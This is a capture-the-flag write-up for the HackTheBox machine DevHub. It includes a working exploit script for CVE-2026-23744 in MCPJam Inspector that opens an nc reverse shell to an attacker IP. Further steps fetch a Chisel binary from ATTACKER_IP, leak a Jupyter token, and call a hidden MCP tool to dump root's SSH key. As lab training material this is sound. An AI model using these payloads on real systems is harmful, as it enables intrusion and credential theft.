# HackTheBox — DevHub Writeup

**Difficulty:** Medium  
**OS:** Linux  
**User:** mcp-dev → analyst  
**Root:** analyst → root  

---

## Reconnaissance

Started with a RustScan to find open ports:

```bash
rustscan -a 10.129.3.219
```

Results:

```
22/tcp  — SSH
80/tcp  — HTTP (nginx)
6274/tcp — Unknown service
```

Added `devhub.htb` to `/etc/hosts` and browsed to `http://devhub.htb`. Port 6274 exposed the **MCPJam Inspector** — a web interface for managing MCP (Model Context Protocol) server connections.

---

## Initial Access — CVE-2026-23744 (RCE on MCPJam Inspector)

Searching for CVE-2026-23744 led to a public PoC on GitHub:  
`https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC`

The vulnerability exists in the `/api/mcp/connect` endpoint of MCPJam Inspector. It accepts a JSON body with a `serverConfig` field that defines a command to execute — with no sanitization. This allows an unauthenticated attacker to run arbitrary OS commands on the server.

Downloaded the PoC `exploit.py` and modified it with our target and attacker details:

```python
import requests
import json

target = "http://devhub.htb:6274"
ip = "10.10.15.229"
port = "4444"
url = f'{target}/api/mcp/connect'

data = {
    "serverConfig": {
        "command": "busybox",
        "args": [
            "nc",
            f"{ip}",
            f"{port}",
            "-e",
            "/bin/bash"
        ],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

response = requests.post(url, json=data, verify=False)
print(response.status_code)
print(response.text)
```

> **Note:** The original PoC used `https://TARGET` — we changed it to `http://devhub.htb:6274` (with correct scheme and port), which was the fix needed to resolve the `InvalidSchema` error from requests.

Set up a listener and ran the exploit:

```bash
rlwrap nc -lnvp 4444
python3 exploit.py
```

Got a shell as `mcp-dev`. Stabilized it with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Enumeration as mcp-dev

Ran `ps aux` to list running processes. Among the output, filtered for Python processes:

```bash
ps aux | grep python
```

This revealed two important things:

```
analyst  1077  ... /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 --no-browser \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 \
  --ServerApp.password=

root  1083  ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Two findings:

1. **Jupyter Lab** is running as `analyst` on `127.0.0.1:8888` — and its authentication token is fully visible in the process arguments because `ps aux` output is world-readable by default on Linux.
2. A separate Python server (`/opt/opsmcp/server.py`) is running as **root** on port 5000.

Also checked `ss -tulnp` to confirm internal ports:

```
127.0.0.1:5000  — OPSMCP server (root)
127.0.0.1:8888  — Jupyter Lab (analyst)
```

---

## What is Jupyter Lab?

Jupyter Lab is a web-based interactive development environment commonly used by data analysts and researchers. It allows users to write and execute code (Python, etc.) directly in the browser via "notebooks". It also includes a built-in **terminal**, which gives full shell access as the user running the Jupyter process — in this case, `analyst`.

It was running locally (not exposed externally), so we needed to tunnel it to our machine.

---

## Lateral Movement — mcp-dev → analyst (via Jupyter Lab)

Since port 8888 was only accessible from localhost, we used **Chisel** to create a reverse port forward tunnel.

Downloaded Chisel on the target:

```bash
wget http://ATTACKER_IP/chisel -O /tmp/chisel
chmod +x /tmp/chisel
```

Started Chisel server on attacker machine:

```bash
./chisel server -p 8080 --reverse
```

Connected from the target to forward port 8888:

```bash
/tmp/chisel client ATTACKER_IP:8080 R:8888:127.0.0.1:8888
```

Now port 8888 was accessible on our local machine. Opened the browser and navigated to:

```
http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Jupyter Lab opened, authenticated as `analyst`. From the **File → New → Terminal** menu, we got a terminal shell as `analyst`.

Read `user.txt`:

```bash
cat /home/analyst/user.txt
```

Also read the OPSMCP server source code (which `mcp-dev` could not access due to file permissions):

```bash
cat /opt/opsmcp/server.py
```

---

## Privilege Escalation — analyst → root (via OPSMCP Hidden Tool)

`server.py` revealed:

**API Key:**
```
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

**Visible tools** (`/tools/list`): `ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`

**Hidden tools** (not listed but callable via `/tools/call`):
```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    ...
}
```

The `ops._admin_dump` tool with `target=ssh_keys` reads `/root/.ssh/id_rsa` and returns it in the response. The server runs as root, so it has full access to this file.

Called the hidden tool from the `mcp-dev` shell (or Jupyter terminal):

```bash
curl -s -X POST "http://127.0.0.1:5000/tools/call" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

The response contained root's private SSH key in JSON format (with `\n` escaped as `\\n`). Cleaned it up:

```bash
echo '<key_content>' | sed 's/\\n/\n/g' > root.key
chmod 600 root.key
```

SSHed in as root:

```bash
ssh -i root.key root@devhub.htb
```

Root shell obtained. Read `root.txt`.

---

## Attack Chain Summary

```
Recon (RustScan)
    └─> Port 6274 — MCPJam Inspector
            └─> CVE-2026-23744 RCE
                    └─> Shell as mcp-dev
                            └─> ps aux leak — Jupyter token + root process
                                    └─> Chisel tunnel → Jupyter Lab as analyst
                                            └─> cat server.py → API key + hidden tool
                                                    └─> ops._admin_dump → root SSH key
                                                            └─> SSH as root
```

---

## Key Takeaways

- Process arguments are world-readable on Linux — never pass secrets via command-line flags
- Jupyter Lab's `--ServerApp.token` flag leaks the auth token to anyone who can run `ps aux`
- Internal-only services with no authentication controls are still dangerous if reachable post-compromise
- Hidden/undocumented API endpoints can be discovered through source code review
